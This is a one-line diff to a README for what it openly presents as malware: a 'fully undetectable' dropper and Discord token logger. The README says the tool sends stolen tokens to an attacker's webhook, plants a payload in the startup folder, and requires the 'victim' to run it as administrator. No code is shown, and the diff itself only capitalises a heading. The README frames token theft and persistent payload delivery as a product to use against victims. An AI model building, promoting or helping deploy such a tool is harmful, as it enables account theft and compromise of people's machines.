@@ -1,5 +1,5 @@
 # Dropper and token logger FUD
-### info:
+### Info:
 Injects discord with a token logger sent to your webhook and drops your payload and places it in the startup folder.
 
 After compiling, the victim needs to run it as administrator.
